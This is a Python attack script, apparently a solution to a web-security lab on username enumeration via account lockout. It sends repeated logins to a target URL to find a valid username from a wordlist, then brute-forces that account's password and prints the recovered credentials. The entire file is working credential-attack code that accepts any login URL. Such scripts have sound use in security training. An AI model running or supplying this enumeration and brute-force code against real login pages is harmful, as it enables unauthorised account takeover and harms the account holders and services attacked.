import requests
import sys
import os
import getopt


def clear_screen():
  if os.name == 'posix':
    os.system('clear')
  else:
    os.system('cls')


def get_username(url, session):
  usernames = open("./usernames.txt", "r")

  for username in usernames:
    username = username.strip()
    for i in range(5):
      data = {'username': username, 'password':  i}
      response = session.post(url, data=data)

      if "Invalid username or password." in response.text:
        clear_screen()
        print(f"[!] Testing username: \"{username}\"")
      else:
        valid_username = username
        usernames.close()
        return valid_username  


def get_password(url, session, valid_username):
  passwords = open("./passwords.txt", "r")
  error_messages = ["You have made too many incorrect login attempts. Please try again in 1 minute(s).", "Invalid username or password."]

  for password in passwords:
    password = password.strip()
    data = {'username': valid_username, 'password':  password}
    response = session.post(url, data=data)
    clear_screen()
    print(f"[*] The username is: \"{valid_username}\"\n[!] Testing password \"{password}\"")

    if (error_messages[0] not in response.text) and (error_messages[1] not in response.text):
      valid_password = password
      passwords.close()
      return valid_password      

def main(argv):
  try:
    opts, args = getopt.getopt(argv, "hu:")
  except getopt.GetoptError:
    print("This is the script for:\n'Username enumeration via account lock'\n\nUsage: python3 auth-5.py -u <url>/login")
    print("\x1b[?25h")
    sys.exit(2)

  for opt, arg in opts:
    if opt == "-u":
      url = arg
    elif opt == "-h":
      print("This is the script for:\n'Username enumeration via account lock'\n\nUsage: python3 auth-5.py -u <url>/login")
      print("\x1b[?25h")
      sys.exit()

  session = requests.Session()
  username = get_username(url, session)
  password = get_password(url, session, username)
  clear_screen()
  
  print(f"Wait 1 minute and enter these credentials:\n[*] The username is: \"{username}\"\n[*] The password is: \"{password}\"")


if __name__ == "__main__":
  # Hide Cursor
  print("\x1b[?25l")
  main(sys.argv[1:])
  # Make cursor visible
  print("\x1b[?25h")
  sys.exit()